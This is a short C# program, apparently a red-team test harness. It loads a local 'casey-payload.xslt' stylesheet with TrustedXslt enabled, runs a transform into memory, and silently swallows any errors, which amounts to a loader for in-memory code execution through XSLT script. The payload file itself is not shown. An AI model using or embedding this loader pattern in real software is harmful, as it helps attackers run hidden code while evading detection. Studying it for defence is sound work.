using System;
using System.IO;
using System.Net;
using System.Reflection;
using System.Xml;
using System.Xml.XPath;
using System.Xml.Xsl;

namespace COM_XSL_Load_InMem_Native
{
    class Program
    {
        static void Main(string[] args)
        {
            NATIVE();
        }

        static void NATIVE()
        {
            XslCompiledTransform transforma = new XslCompiledTransform();
            transforma.Load("file:///source/COM-XSL-Load-InMem-DotNet/casey-payload.xslt", XsltSettings.TrustedXslt, new XmlUrlResolver());
            try
            {
                transforma.Transform(
                    XmlReader.Create(new StringReader(new WebClient().DownloadString("file:///source/COM-XSL-Load-InMem-DotNet/casey-xml.xml")),
                        new XmlReaderSettings() { Async = true }),
                    XmlWriter.Create(new MemoryStream(), new XmlWriterSettings() { Async = true, ConformanceLevel = ConformanceLevel.Fragment })
                );
            }
            catch(Exception e)
            {}

            Console.ReadLine();
        }
    }
}
